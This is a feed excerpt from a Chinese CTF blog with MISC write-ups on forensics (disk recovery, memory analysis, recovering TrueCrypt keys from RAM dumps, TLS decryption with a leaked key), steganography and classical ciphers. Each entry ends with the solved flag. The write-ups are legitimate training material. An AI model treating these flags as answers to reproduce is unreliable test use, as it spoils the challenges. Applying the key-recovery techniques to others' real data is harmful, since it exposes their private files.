    <content type="html"><![CDATA[<h3><span id="data2">Data[2]</span></h3><hr><h3><span id="21"><em>21</em></span></h3><h4><span id="xman2018排位赛file"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。来源：<a href="https://github.com/hebtuerror404/CTF_competition_warehouse_2018">https://github.com/hebtuerror404/CTF_competition_warehouse_2018</a></p></blockquote><p>得到attachment.img</p><p>第一感觉是volatility,失败</p><p>学到了新招</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete attachment.img --restore-all</span><br></pre></td></tr></table></figure><p>恢复被删除的目录或文件</p><p>得到RECOVERED_FILES/file.17</p><p><img src="6CpQmT.png" alt="6CpQmT"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;fugly_cats_need_luv_2&#125;</span><br></pre></td></tr></table></figure><h3><span id="22"><em>22</em></span></h3><h4><span id="greatescape"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>不明所以，稍作记录。</p><p>得到一个数据包，通过追踪发现存在ssc.key，格式类似rsa私钥，另存为</p><p>编辑-&gt;首选项-&gt;protocols-&gt;TLS 把刚才的key通过本地导入</p><p>追踪http得到flag</p><h3><span id="23"><em>23</em></span></h3><h4><span id="bsidessf2019diskimage"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到一张图片</p><p>binwalk foremost都无果的情况下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg -a diskimage.png</span><br></pre></td></tr></table></figure><p><img src="6iNTjH.png" alt="6iNTjH"></p><p>&quot;b8,rgb,lsb,xy&quot;中存在东西</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg -e &#39;b8,rgb,lsb,xy&#39; diskimage.png &gt; disk.dat</span><br></pre></td></tr></table></figure><p>导出</p><p>用testdisk进行分析</p><p><img src="6iU1V1.png" alt="6iU1V1"></p><p>回车</p><p><img src="6iU3Ux.png" alt="6iU3Ux"></p><p>回车</p><p><img src="6iU856.png" alt="6iU856"></p><p>找到其中最与众不同的那一个</p><p>根据提示，按C拷贝到想要的位置</p><p>查看</p><p><img src="6iUJPK.png" alt="6iUJPK"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CTF&#123;FAT12_FTW&#125;</span><br></pre></td></tr></table></figure><h3><span id="24"><em>24</em></span></h3><h4><span id="rctf2019disk"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到encrypt.vmdk</p><p>一时没有方向，拖进010看到</p><p><code>rctf&#123;unseCure_quick_form4t_vo1ume</code></p><p>试图打开vmdk却被告知压缩包已损坏</p><p>这里学到一招，可以用7z</p><p><a href="https://sparanoid.com/lab/7z/">https://sparanoid.com/lab/7z/</a></p><p>可以看到有一个0.fat</p><p>但无法直接操作</p><p>通过‘提取’得到0.fat</p><p><img src="6VXsun.png" alt="6VXsun"></p><p>[FAT文件可以使用VeraCrypto进行挂载]</p><p><a href="https://www.veracrypt.fr/en/Downloads.html">https://www.veracrypt.fr/en/Downloads.html</a></p><p>存在密码，rctf能解</p><p>到这一步挂载成功：</p><p><img src="6VXouR.png" alt="6VXouR"></p><p>看看是啥：</p><p><img src="6VXouR.png" alt="6VXouR"></p><p>给了另一个密码：RCTF2019</p><p>这里体现了神奇之处：在挂载输入密码的时候，不同的密码可以进入不同的文件系统</p><p>重新挂载：</p><p>却被告知无法访问，需要格式化等</p><p>参考之前，但无法直接拖入010，换winhex试试</p><p>winhex-&gt;Tools-&gt;Open Disk-&gt;Select Disk,选择挂载的盘</p><p>得到后半部分</p><p><code>_and_corrupted_1nner_v0lume&#125;</code></p><p><code>rctf&#123;unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume&#125;</code></p><h3><span id="25"><em>25</em></span></h3><h4><span id="vampn2020-公开赛内存取证"></span></h4><blockquote><p><a href="http://dd.zhaoj.in/3ehg38dgey84d3dhou32d3/mem.raw">http://dd.zhaoj.in/3ehg38dgey84d3dhou32d3/mem.raw</a>得到的 flag 请包上 flag{} 提交。Hint:记事本</p></blockquote><p>这是一道复现地很费劲的题😂</p><p>得到mem.raw和VOL(VOL对应后面链接失效的地方,按下不表)</p><p>内存取证起手式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo</span><br></pre></td></tr></table></figure><p>得到可能版本后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 pslist</span><br></pre></td></tr></table></figure><p>查看进程</p><p><img src="6mEkTO.png" alt="6mEkTO"></p><p>关注</p><p>TrueCrypt.exe   3364notepad.exe     3552mspaint.exe     2648</p><p>分别dumpit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3364 --dump-dir&#x3D;.&#x2F;</span><br><span class="line"></span><br><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3552 --dump-dir&#x3D;.&#x2F;</span><br><span class="line"></span><br><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 2648 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>挨个看</p><p>1)mspaint</p><p>此处需要用到Gimp工具，一个类似画图的工具得到密码：</p><p>1YxfCQ6goYBD6Q</p><p>2)notepad</p><p>使用editbox插件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 editbox</span><br></pre></td></tr></table></figure><p><img src="6mVbIU.png" alt="6mVbIU"></p><p>得到网盘链接，但已失效，对应题干中的VOL</p><p>3)TrueCrypt</p><p>TrueCrypt破解工具Elcomsoft Forensic Disk Decryptor</p><p>Decrypt or mount disk-&gt;TrueCrypt-&gt;select&amp;Memory dump&amp;Browse-&gt;mount</p><p>发现多了个盘，其中存在key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uOjFdKu1jsbWI8N51jsbWI8N5</span><br></pre></td></tr></table></figure><p>得到VOL的时候就该想到需要挂载，使用VeraCrypt,按之前学到的用法</p><p>此处注意需要勾选TrueCrypt</p><p><img src="6me96s.png" alt="6me96s"></p><p>得到fffflag.zip</p><p>fffflag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RoarCTF&#123;wm_D0uB1e_TC-cRypt&#125;</span><br></pre></td></tr></table></figure><h3><span id="26"><em>26</em></span></h3><h4><span id="ddctf2018流量分析"></span></h4><blockquote><p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c提示二：注意补齐私钥格式-----BEGIN RSA PRIVATE KEY-----XXXXXXX-----END RSA PRIVATE KEY-----</p><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到</p><p><img src="ddctf1.png" alt="ddctf1"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;E5&#x3D;B0&#x3D;8F&#x3D;E5&#x3D;BC&#x3D;A0&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;A5&#x3D;BD&#x3D;EF&#x3D;BC&#x3D;9A</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;A5&#x3D;BD&#x3D;EF&#x3D;BC&#x3D;8C&#x3D;E8&#x3D;AF&#x3D;B7&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;86&#x3D;E5&#x3D;AF&#x3D;86&#x3D;E9&#x3D;92&#x3D;A5&#x3D;E5&#x3D;AE&#x3D;89&#x3D;E8&#x3D;A3&#x3D;85&#x3D;E5&#x3D;88&#x3D;B0&#x3D;E6&#x3D;9C&#x3D;8D&#x3D;E5&#x3D;8A&#x3D;A1&#x3D;E5&#x3D;99&#x3D;A8&#x3D;E4&#x3D;B8&#x3D;8A&#x3D;E3&#x3D;80&#x3D;82&#x3D;E8&#x3D;B0&#x3D;A2&#x3D;E8&#x3D;B0&#x3D;A2</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br><span class="line"></span><br><span class="line">&#x3D;20</span><br></pre></td></tr></table></figure><p>Quoted-Printable</p><p><a href="http://www.mxcz.net/tools/quotedprintable.aspx">http://www.mxcz.net/tools/quotedprintable.aspx</a></p><p>解码后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">小张你好：</span><br><span class="line">你好，请你将密钥安装到服务器上。谢谢</span><br></pre></td></tr></table></figure><p>以及一堆base64编码传输数据</p><p>解码后得到png</p><p><img src="ddctf2.png" alt="ddctf2"></p><p>识图后调了好久</p><p>补齐私钥格式后，</p><p>wireshark里，编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;RSA keys list-&gt;Edit</p><p>再追踪其中的http流</p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DDCTF&#123;0ca2d8642f90e10efd9092cd6a2831c0&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;data2&quot;&gt;Data[2]&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;21&quot;&gt;&lt;em&gt;21&lt;/em&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;xman2018排位赛file&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockqu</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-image-2</title>
    <link href="http://mklkx.github.io/2021/03/22/MISC-image-2/"/>
    <id>http://mklkx.github.io/2021/03/22/MISC-image-2/</id>
    <published>2021-03-22T12:19:30.000Z</published>
    <updated>2021-05-04T11:39:44.519Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="image2">image[2]</span></h3><hr><h3><span id="21">21</span></h3><h4><span id="网鼎杯-2020-青龙组虚幻2"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>不明全部，稍做记录。</p><p>得到一张类似二维码的小图</p><p><a href="https://imgtu.com/i/6Pbpan"><img src="https://s3.ax1x.com/2021/03/01/6Pbpan.png" alt="6Pbpan.png" border="0"></a></p><p>将其分离出rgb三个通道（笔者用的stegsolve）</p><p>根据拼接，得到类似汉信码</p><p>存在一定的爆破和容差</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">for k in range(5):</span><br><span class="line"># 用到的三张图片就是上面说的 RGB 通道分开的图片（未放大10倍）</span><br><span class="line">    R &#x3D; Image.open(&#39;solved_r.bmp&#39;)</span><br><span class="line">    G &#x3D; Image.open(&#39;solved_g.bmp&#39;)</span><br><span class="line">    B &#x3D; Image.open(&#39;solved_b.bmp&#39;)</span><br><span class="line">    GBR &#x3D; Image.new(&#39;RGB&#39;, (31, 31))</span><br><span class="line">    TMP &#x3D; Image.new(&#39;RGB&#39;, (7, 7))</span><br><span class="line">    GBRReadble &#x3D; Image.new(&#39;RGB&#39;, (372, 372))</span><br><span class="line"></span><br><span class="line">    n_r &#x3D; 0</span><br><span class="line">    n_g &#x3D; 0</span><br><span class="line">    n_b &#x3D; 0</span><br><span class="line">    p_r &#x3D; R.load()</span><br><span class="line">    p_g &#x3D; G.load()</span><br><span class="line">    p_b &#x3D; B.load()</span><br><span class="line">    pim &#x3D; GBR.load()</span><br><span class="line">    pimr &#x3D; GBRReadble.load()</span><br><span class="line">    tmp &#x3D; TMP.load()</span><br><span class="line"></span><br><span class="line">    for i in range(31):</span><br><span class="line">        if i%3 &#x3D;&#x3D; 0:</span><br><span class="line">            for j in range(31):</span><br><span class="line">                pim[i, j] &#x3D; p_g[j, n_g]</span><br><span class="line">            n_g &#x3D; n_g + 1</span><br><span class="line">        elif i%3 &#x3D;&#x3D; 1:</span><br><span class="line">            for j in range(31):</span><br><span class="line">                pim[i, j] &#x3D; p_b[j, n_b]</span><br><span class="line">            n_b &#x3D; n_b + 1</span><br><span class="line">        elif i%3 &#x3D;&#x3D; 2:</span><br><span class="line">            for j in range(31):</span><br><span class="line">                pim[i, j] &#x3D; p_r[j, n_r]</span><br><span class="line">            n_r &#x3D; n_r + 1</span><br><span class="line"></span><br><span class="line">    for i in range(0, 7):</span><br><span class="line">        for j in range(0, 7):</span><br><span class="line">            tmp[i, j] &#x3D; pim[i, j]</span><br><span class="line">            </span><br><span class="line">    TMP &#x3D; TMP.rotate(180)</span><br><span class="line">    tmp &#x3D; TMP.load() </span><br><span class="line"></span><br><span class="line">    for i in range(0, 7):</span><br><span class="line">        for j in range(0, 7):</span><br><span class="line">            pim[i, j] &#x3D; tmp[i, j]       </span><br><span class="line">           </span><br><span class="line">    for i in range(14, 23):</span><br><span class="line">        for j in range(24, 31):</span><br><span class="line">            if (randint(0, 1) &#x3D;&#x3D; 0):</span><br><span class="line">                pim[i, j] &#x3D; (0,0,0)</span><br><span class="line">                </span><br><span class="line">    for i in range(372):</span><br><span class="line">        for j in range(372):</span><br><span class="line">            pimr[j, i] &#x3D; (255,255,255)</span><br><span class="line"></span><br><span class="line">    for i in range(31,341):</span><br><span class="line">        for j in range(31,341):</span><br><span class="line">            pimr[j, i] &#x3D; pim[(j-31)&#x2F;&#x2F;10, (i-31)&#x2F;&#x2F;10]</span><br><span class="line"></span><br><span class="line">    GBRReadble &#x3D; GBRReadble.rotate(90)</span><br><span class="line"></span><br><span class="line">    filename &#x3D; &quot;gbr&quot;+ str(k) + &quot;.png&quot;</span><br><span class="line">    GBRReadble.save(filename)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/r42135d1r2r4/article/details/106063796">https://blog.csdn.net/r42135d1r2r4/article/details/106063796</a></p><p><a href="https://www.cnblogs.com/p201821440039/p/12900273.html">https://www.cnblogs.com/p201821440039/p/12900273.html</a></p><h3><span id="22">22</span></h3><h4><span id="inshack201710-cl0v3rf13ld-lane-signal"></span></h4><blockquote><p>得到的 flag 请包上 flag{} 提交。</p></blockquote><p>得到find_me.unk</p><p>010分析，后缀名改为.jpg</p><p>得到一张图片，写着MONSTERS COME IN MANY FORMS</p><p>尝试提交，不对</p><p>foremost分离，得到png图片，写着摩斯电码的字典，右下角发现不寻常</p><p><img src="6i8yPe.png" alt="6i8yPe"></p><p>通过解密：HELPME</p><p>尝试提交，不对</p><p>继续搜索，Png文件尾存在ogg文件，通过查询是一种音频文件</p><p>另存为.ogg</p><p>au中查看，明显莫斯，解码得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;M0R53_W1LL_N3V3R_4G3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;image2&quot;&gt;image[2]&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;21&quot;&gt;21&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;网鼎杯-2020-青龙组虚幻2&quot;&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-3</title>
    <link href="http://mklkx.github.io/2021/03/22/MISC-3/"/>
    <id>http://mklkx.github.io/2021/03/22/MISC-3/</id>
    <published>2021-03-22T12:00:00.000Z</published>
    <updated>2021-05-04T11:38:56.511Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="simple">simple</span></h2><hr><h3><span id="41">41</span></h3><h4><span id="2021年春秋杯新年欢乐赛十二宫的挑衅">2021年“春秋杯”新年欢乐赛【十二宫的挑衅】</span></h4><blockquote><p>但愿你能解出密文，不然我就会继续犯罪:)本题获取flag提交前请加上flag{}</p></blockquote><p>通过查询发现是历史真实案件改编，根据新闻报道，对以下符号做如下处理</p><p>1）将图片中的符号一一放入excel中</p><p>2）按报道对符号进行处理</p><p><img src="%E5%8D%81%E4%BA%8C%E5%AE%AB.jpg" alt="十二宫"></p><p>3)将符号放入txt中，利用AZdecrypt1.19</p><p><img src="%E5%8D%81%E4%BA%8C%E5%AE%AB.png" alt="十二宫"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;WUUHUUTAKEOFF&#125;</span><br></pre></td></tr></table></figure><h3><span id="42">42</span></h3><h4><span id="很好的色彩呃">很好的色彩呃？</span></h4><blockquote><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote></blockquote><p>根据题目提示：颜色</p><p>打开PS，取色器提取颜色的十六进制</p><p><img src="ps.PNG" alt="ps"></p><p>分别为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8b8b61</span><br><span class="line">8b8b61</span><br><span class="line">8b8b70</span><br><span class="line">8b8b6a</span><br><span class="line">8b8b65</span><br><span class="line">8b8b73</span><br><span class="line"></span><br><span class="line">&gt;&gt;6161706A6573</span><br><span class="line">HEX&gt;&gt;</span><br><span class="line">aapjes</span><br></pre></td></tr></table></figure><p>flag{aapjes}</p><h3><span id="43">43</span></h3><h4><span id="guet-ctf2019520的暗示"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>得到photo.dat，与0x33异或</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data &#x3D; open(&quot;photo.dat&quot;,&#39;rb&#39;)</span><br><span class="line">strs &#x3D; data.read()</span><br><span class="line">flag &#x3D; open(&quot;1.jpg&quot;,&#39;ab+&#39;)</span><br><span class="line">for i in strs:</span><br><span class="line">    flag.write(bytes([i ^ 0x33]))</span><br></pre></td></tr></table></figure><p>得到一张运营商的定位</p><p>根据LTE可以定位基站地址http://www.gpsspg.com/bs.htm</p><p>flag{桂林电子科技大学花江校区}</p><p>妙啊</p><h3><span id="44">44</span></h3><h4><span id="key不在这里"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>一张二维码，扫码得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cn.bing.com&#x2F;search?q&#x3D;key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m&#x3D;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs&#x3D;n&amp;form&#x3D;QBRE&amp;sp&#x3D;-1&amp;sc&#x3D;0-38&amp;sk&#x3D;&amp;cvid&#x3D;2CE15329C18147CBA4C1CA97C8E1BB8C</span><br></pre></td></tr></table></figure><p>直接搜索无所得</p><p>观察得，102，108，97，103等老朋友</p><p>十进制转ascii</p><p>urldecode</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><br></pre></td></tr></table></figure><h3><span id="45">45</span></h3><h4><span id="inshack2018self-congratulation"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>明显图片中存在一块类似二维码的黑白块</p><p><img src="bin.PNG" alt="bin"></p><p>考虑转换为二进制</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">001100010011001000110011001101000011010100110110001101110011100000</span><br></pre></td></tr></table></figure><p>转换为ascii失败</p><p>转换为字符串https://www.qqxiuzi.cn/bianma/erjinzhi.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;12345678&#125;</span><br></pre></td></tr></table></figure><h3><span id="46">46</span></h3><h4><span id="inshack2019gflag"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">My brother likes esoteric programming. He sent me this file but I don&#39;t see what it is for. Could you help me ?</span><br><span class="line"></span><br><span class="line">[GFlag files](https:&#x2F;&#x2F;static.ctf.insecurity-insa.fr&#x2F;a7572eb34ba9700b39f1ba7f5869bf301b67d406.tar.gz)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和类似这样的1755行字符</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">M73 P0 R2</span><br><span class="line">M201 X9000 Y9000 Z500 E10000</span><br><span class="line">M203 X500 Y500 Z12 E120</span><br><span class="line">M204 P2000 R1500 T2000</span><br><span class="line">M205 X10.00 Y10.00 Z0.20 E2.50</span><br><span class="line">M205 S0 T0</span><br><span class="line">M107</span><br></pre></td></tr></table></figure><p>通过查询得知这是一种G语言</p><p>以及网站<a href="https://ncviewer.com/">https://ncviewer.com/</a></p><p>类似画图的意思</p><p><img src="G.PNG" alt="G"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;3d_pr1nt3d_fl49&#125;</span><br></pre></td></tr></table></figure><h3><span id="47">47</span></h3><h4><span id="gkctf2020sail-a-boat-down-the-river"></span></h4><blockquote><p>注意：得到的 flag 请包上 flag{} 提交Hint:闪烁的光芒;是一行不是一列;加密方式很常见</p></blockquote><p>挺有意思但是也挺让人难受的题目</p><p>得到flag.mp4和vocal.rar</p><p>flag.mp4是一段监控，能得到一张二维码</p><p>给出一个加密的网盘地址</p><p><a href="https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ">https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ</a></p><p>根据提示1，反复观看视频，根据中央闪烁的光芒，得到一段摩斯电码：</p><p>-.-- .-- —… --.</p><p>yw8g</p><p>从而得到网盘里的数独题：</p><p><img src="shudu.PNG" alt="shudu"></p><p>得到密钥52693795149137</p><p>需要密钥的常用密码？</p><p>首选AES</p><p>成了，<a href="http://GG0kc.tf">GG0kc.tf</a></p><p>得到ovex文件，利用overture打开，</p><p>音符中找到’fun}‘,‘is_’,’{gkctf_’</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;gkctf_is_fun&#125;</span><br></pre></td></tr></table></figure><h3><span id="48">48</span></h3><h4><span id="npuctf2020碰上彩虹吃定彩虹"></span></h4><blockquote><p>得到的 flag 建议包上 flag{} 提交。感谢西北工业大学信息安全协会供题。</p></blockquote><p>老千层饼了</p><p>得到lookatme.txt,maybehint.txt,secret</p><p>1)先看lookatme.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">achnrvxzzuglarucalznwcygfggrufryvbzqjoxjymxvchhhdmliddcwmhghclpebtzwlojvew</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>notepad++能看到末尾存在莫斯电码，解码：AUTOKEY</p><p>通过查询，为一种加密方法，得到解密脚本</p><p><a href="https://github.com/hitcxy/break_autokey">https://github.com/hitcxy/break_autokey</a></p><p><a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/">http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</a></p><p>得到：IAMTHEPASSWD</p><p>2)再看maybehint.txt</p><p>通过vim查看，能看到一些&lt;200b&gt;&lt;200c&gt;&lt;200d&gt;字样，通过宽字符隐写解密网站http://330k.github.io/misc_tools/unicode_steganography.html，末尾需要设置勾选</p><p><img src="%E5%AE%BD%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99.PNG" alt="宽字符隐写"></p><p>能得到提示:do u know NTFS?</p><p>打开NtfsStreamsEditor2，对整个文件夹进行扫描，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;wwZlZ&#x3D;8W&#x3D;cndwljcdcG8wdj8W8Z8dZllGjZc&#x3D;8lWjnlWd8WwZ5j&#x3D;l8ccWZcZGjd5ZwZ5WZ8d&#x3D;Zcwjwl5Gnn&#x3D;WdwcwlnWd5lGnZWlnnwdnjnw8ndnc58d5cndl&#x3D;njZl&#x3D;WddjwWWwZllj5c5jGwZnZ5W&#x3D;cZljdwd8c&#x3D;85ndGGljcl5ccwd&#x3D;W&#x3D;l8w&#x3D;5lwWn8WnwnWlGZwdcnGGl5G&#x3D;8W&#x3D;&#x3D;cnnWZnWjZ&#x3D;wWcGwZcWc8ncWW&#x3D;5jnWwcZl8W&#x3D;8cdwWldlnwW5ddwlnlwncWlcwGZddj5djZWc5jcWdn5jdjwnj85GWGjnjwGd&#x3D;jZGj5j&#x3D;&#x3D;jwjlw8dlwWj5Wjn5n8dwwdjZlc5lZwdWldZlnGwl85cWnjd&#x3D;WcWlwj8WGdlGncnZWGGd5ZncW5d55nW5wl&#x3D;Wj8jGWnWj8jwZ&#x3D;ZwWZ88nWG5nn5WlWnGdWw5Zn8jdl&#x3D;nGcnll8WncZjnGn&#x3D;dlwn5W8wlWjlnl5ccnGWGnnnc58WnjlGnG55Zwdn5cZdjdZZ5WljG5G5wcldd&#x3D;Wlc8Z&#x3D;8nGj&#x3D;jWd8w8Wd&#x3D;w8nccc8wZdjcnGdljZnnj5ww8885&#x3D;lcWW8W8j5dG8jZZwG55GjnwZ&#x3D;W5Z8G5ZlGc5ZZncZ5cd8j85GW5nj&#x3D;WWncn55Gj5nj5nwnW58jG8GcnjZdWcl8wj8n&#x3D;cj&#x3D;8l8cn5jjcjn8lldn&#x3D;Gjw8&#x3D;cjcdWWjGddZljdjdZnG8djnZccZldlWllw5ZZ8wj5Gn&#x3D;&#x3D;5w8Z&#x3D;j55n&#x3D;ZZ5wdww8lndwd8Wlj8WGjnl&#x3D;nncZ&#x3D;W8ZZWZnjjlwWGZZlZc5c&#x3D;&#x3D;d8Zl855wZn&#x3D;W&#x3D;w8wWjZ85cGc&#x3D;&#x3D;5Z8ccjdw5GnZWnGjcdGGnZ5wwwWGG5d&#x3D;W5ldjwGZZdZwdG5cGGnZGlGc&#x3D;W5ccWZ8&#x3D;cGljdGcdld&#x3D;8cj8jwn&#x3D;lj88ZZ5jn5lcZ&#x3D;Gdw&#x3D;Zl58WZZl5ccwccwG5d5w8Z5wllj5ddnn&#x3D;5&#x3D;w8588WwGj&#x3D;l5G55dWG8cl&#x3D;GcjWwlwG&#x3D;lWWnZ&#x3D;dZG85Gcjc5&#x3D;wnw&#x3D;j&#x3D;&#x3D;Gndnddjwn5c&#x3D;c5W5wwdWlG5nWZwnGw8&#x3D;lcWldcwnG5Wcjj&#x3D;cWlGZc8Gn58ZWjZ85ljlncZj5cc&#x3D;dZWGjd&#x3D;d8ncZ8www55&#x3D;cw&#x3D;GWZn5ZZlnWld&#x3D;cWcnclWlZG5djGW&#x3D;cl8&#x3D;ZG8cZwwc8wl&#x3D;88W5ZwZ&#x3D;jwZGGlcWcWnZZ5Zj5w5ZdZclZZWnccGw&#x3D;&#x3D;cG8W8ZWlc8wcZ555Z85ljWG5jZ&#x3D;8&#x3D;wllWjWjlZc5lG8cwWlnjlGlW&#x3D;l5&#x3D;n&#x3D;lGwnjGGjGdwj85ddW5ZwZ&#x3D;ddjWldj&#x3D;cjljjGwndZjWWZGcdWcZW5cdldj8WZjGljlWncZ5&#x3D;8jnZWjl8wjZG5Zwlcl5dd</span><br></pre></td></tr></table></figure><p>明显词频分析：ZW5jcnlwdG8=</p><p>base后：encrypto</p><p>通过查询，encrypto为一加密软件https://macpaw.com/encrypto</p><p>加密后统一后缀为.crypto</p><p>更改secret为secret.crypto</p><p>3)结合lookatme.txt中得iamthepasswd，尝试解密</p><p>始终无法解密，卡住</p><p>strings secret.crypto，发现异常字符(Oh! You caught me! But…)</p><p>在010中选中并删除后，重新保存，解密</p><p>得到彩虹.png</p><p>得益于做题经验，放进ps，查看相近的黄色色块，得到不同之处:112 64 115 115 87 100</p><p>p@ssWd</p><p>尝试提交flag，错误</p><p>继续查看图片，更改后缀为.zip，解密得到弗拉格.docx</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eeeeeeeeeepaeaeeeaeAeeeeeeaeeeeeeeeeeccccisaaaaeejeeeeeejiiiiiiLiiiiijeeeeeejeeeeeeeeeeeeeeeeeeeejcceeeeeeeeeeePeeeeeeeejaaiiiiiiijcciiiiiiiiiijaaijiiiiiiiiiiiiiiiiiiiijeeeeeeHeeeeeeeeeeeeeeeeejcceeeeeeeeeeeejaaiiiijeeeeeeejceeeeeeeeeeeeeeeeeeeeeeeeejceeeeeeeeeeeeeeeeejaeeeeeejciiUiiiiiiiiiiiiiiiiijaeeeejceeeeeeeeeCeeeeeeeeejajciiiiiiiiiiiiiiiiiiijaaiiiijiijeeeeeeeeeeejKcciiiiiiiiiiiiiiijaaij</span><br></pre></td></tr></table></figure><p>捡出大写字母ALPHUCK</p><p><a href="https://www.dcode.fr/alphuck-language">https://www.dcode.fr/alphuck-language</a></p><p>解密得</p><p><img src="alphuck.PNG" alt="alphuck"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1t&#39;s_v3ry_De1iCi0us~!&#125;</span><br></pre></td></tr></table></figure><p>好家伙</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;span id=&quot;simple&quot;&gt;simple&lt;/span&gt;&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;41&quot;&gt;41&lt;/span&gt;&lt;/h3&gt;
